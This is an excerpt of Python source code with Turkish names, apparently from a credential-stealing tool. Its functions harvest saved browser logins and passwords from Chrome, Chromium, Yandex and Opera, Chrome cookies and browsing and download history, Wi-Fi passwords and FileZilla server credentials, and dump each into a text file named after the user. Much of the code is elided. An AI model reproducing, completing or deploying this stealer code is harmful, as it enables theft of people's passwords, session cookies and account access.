...
def ChromePass():
    if not os.path.exists(chrome_yolu + 'Login Data'):
    ...
    with open(app_data + f'{kullanici_adi}_ChromePass.txt', "w+") as file:
    ...
    for sonuc in gelen_veri:
        with open(app_data + f'{kullanici_adi}_ChromePass.txt', "a+") as file:
            file.write(sonuc + '\n')

def ChromeCookies():
    if not os.path.exists(chrome_yolu + 'Cookies'):
    ...
    with open(app_data + f'{kullanici_adi}_ChromeCookies.txt', "w+") as file:
        file.write(ust_bilgi)
    # Sonuçları getir
    gelen_veri = []
    ...
    for sonuc in gelen_veri:
        with open(app_data + f'{kullanici_adi}_ChromeCookies.txt', "a+") as file:
            file.write(sonuc + '\n')

def ChromeDownloadHistory():
    if not os.path.exists(chrome_yolu + 'History'):
    ...
    with open(app_data + f'{kullanici_adi}_ChromeDownloadHistory.txt', "w+") as file:
        file.write(ust_bilgi)
    # Sonuçları getir
    gelen_veri = []
    ...
    for sonuc in gelen_veri:
        with open(app_data + f'{kullanici_adi}_ChromeDownloadHistory.txt', "a+") as file:
            file.write(sonuc + '\n')
...
def ChromeURLHistory():
    ...
    with open(app_data + f'{kullanici_adi}_ChromeURLHistory.txt', "w+") as file:
        file.write(ust_bilgi)
    # Sonuçları getir
    gelen_veri = []
    ...
    for sonuc in gelen_veri:
        try:
            with open(app_data + f'{kullanici_adi}_ChromeURLHistory.txt', "a+") as file:
                file.write(sonuc + '\n')
        except:
            pass
...
def WiFiPass():
    ...
    # Dosya Oluştur Başlık Gir
    ust_bilgi = txt_baslik + '\n\n\t\t\tWiFi Şifreleri\n\n'
    with open(app_data + f'{kullanici_adi}_WifiPass.txt', "w+") as file:
    ...
    for i in profiles:
        try:
            ...
            try:
                ...
                with open(app_data + f'{kullanici_adi}_WifiPass.txt', "a+") as file:
                    cikti = '\n' + sonuc + '\n' + '=' * 100
                    file.write(cikti)
            except IndexError:
                sonuc = "{:<30}|  {:<}".format(i, "")
...
def ChromiumPass():
    if not os.path.exists(chromium_yolu + 'Login Data'):
    ...
    with open(app_data + f'{kullanici_adi}_ChromiumPass.txt', "w+") as file:
        file.write(ust_bilgi)
    # Sonuçları getir
    gelen_veri = []
    cursor.execute('SELECT signon_realm, username_value, password_value FROM logins')
    ...
    for sonuc in gelen_veri:
        with open(app_data + f'{kullanici_adi}_ChromiumPass.txt', "a+") as file:
            file.write(sonuc + '\n')

def YandexPass():
    if not os.path.exists(yandex_yolu + 'Ya Login Data.db'):
    ...
    with open(app_data + f'{kullanici_adi}_YandexPass.txt', "w+") as file:
        file.write(ust_bilgi)
    # Sonuçları getir
    gelen_veri = []
    ...
    for sonuc in gelen_veri:
        with open(app_data + f'{kullanici_adi}_YandexPass.txt', "a+") as file:
            file.write(sonuc + '\n')

def OperaPass():
    if not os.path.exists(opera_yolu + 'Login Data'):
    ...
    with open(app_data + f'{kullanici_adi}_OperaPass.txt', "w+") as file:
        file.write(ust_bilgi)
    # Sonuçları getir
    gelen_veri = []
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    ...
    for sonuc in gelen_veri:
        with open(app_data + f'{kullanici_adi}_OperaPass.txt', "a+") as file:
            file.write(sonuc + '\n')

def FileZillaPass():
    if os.path.isfile(filezilla_yolu + 'recentservers.xml') is not True:
        return
    root = etree.parse(filezilla_yolu + 'recentservers.xml').getroot()

    # Dosya Oluştur Başlık Gir
    ust_bilgi = txt_baslik + '\n\n\t\t\tFileZilla Şifreleri\n\n'
    with open(app_data + f'{kullanici_adi}_FileZillaPass.txt', "w+") as file:
        file.write(ust_bilgi)
    # Sonuçları getir
    gelen_veri = []
    for i in range(len(root[0])):
        ...
        try:
            ...
            pass
    for sonuc in gelen_veri:
        with open(app_data + f'{kullanici_adi}_FileZillaPass.txt', "a+") as file:
            file.write(sonuc + '\n')
